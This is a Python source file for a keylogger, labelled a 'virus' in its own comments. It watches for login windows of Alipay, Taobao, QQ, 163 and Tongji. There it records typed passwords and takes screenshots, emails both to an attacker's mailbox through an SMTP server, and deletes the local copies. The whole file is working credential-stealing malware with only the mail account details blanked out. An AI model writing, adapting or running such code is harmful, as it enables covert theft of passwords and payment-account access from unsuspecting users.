# -*- coding: utf-8 -*- #
import os
import time
import pythoncom
import smtplib
import pyHook
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


sender = 'XXXXXXXXXXx@XXX.com'
receiver = 'XXXXXXXXXX@XXX.com'
username = 'XXXXXXXXXX@XXX.com'
password = 'XXXXXXXXXX'  # hacker's email login pwd 
smtp = smtplib.SMTP()
smtp = smtplib.SMTP()

# virus will steal info from puppet computer and send it to hacker by email
def send_email(msg, file_name):
    msgRoot = MIMEMultipart('related')
    msgRoot['Subject'] = file_name  
    msgText = MIMEText('%s' % msg, 'html', 'utf-8')  
    msgRoot.attach(msgText)
    # make the stealed info an enclosure
    att = MIMEText(open('%s' % file_name, 'rb').read(), 'base64', 'utf-8')  
    att["Content-Type"] = 'application/octet-stream'
    att["Content-Disposition"] = 'attachment; filename="%s"' % file_name
    msgRoot.attach(att)
    while 1:
        try:
            smtp.sendmail(sender, receiver, msgRoot.as_string())
            break
        except:
            try:
                smtp.connect('smtp.163.com')  
                smtp.login(username, password)
            except:
                print "failed to login to smtp server"
    # delete the stealed info after sending it  ๑乛◡乛๑
    path = os.getcwd() + "\\" + file_name  
    if os.path.exists(path):
        os.remove(path)

# listen to the mouse event. capture the screen as a pic and send it to hacker when detecting a submit pwd action 
def onMouseEvent(event):
    global MSG
    if len(MSG) != 0:
        pic_name = time.strftime('%Y%m%d_%H%M%S', time.localtime(time.time()))
        pic_name = "mouse_" + pic_name + ".png"
        pic = ImageGrab.grab()
        pic.save('%s' % pic_name) 
        send_email(MSG, pic_name)
        MSG = ''
    return True

# listen to the keyboard event. 
def onKeyboardEvent(event):
    global MSG
    title = event.WindowName.decode('GBK')
    # detect the title of window to judge if it is a target login page. 
    if title.find(u"支付宝") != -1 or title.find(u"淘宝") != -1 or title.find(u'QQ') != -1 or title.find(u'Tongji') != -1 or title.find(u'163') != -1:
        # Ascii:  8-Backspace , 9-Tab ,13-Enter //use MSG to steal the pwd
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)
        if (event.Ascii == 9) or (event.Ascii == 13):
            pic_name = time.strftime('%Y%m%d_%H%M%S', time.localtime(time.time()))
            pic_name = "keyboard_" + pic_name + ".png"
            pic = ImageGrab.grab()   
            pic.save('%s' % pic_name)
            send_email(MSG, pic_name)
            MSG = ''
    return True

def main():
    # create hook handler
    hm = pyHook.HookManager()
    # listen to the mouse
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()
    # listen to the keyboard
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    # repeat to get info
    pythoncom.PumpMessages()


if __name__ == "__main__":
    try:
        #log in smtp server
        smtp.connect('smtp.163.com')  
        smtp.login(username, password)
    except:
        print "failed to login to smtp server"
    MSG = ''
    main()
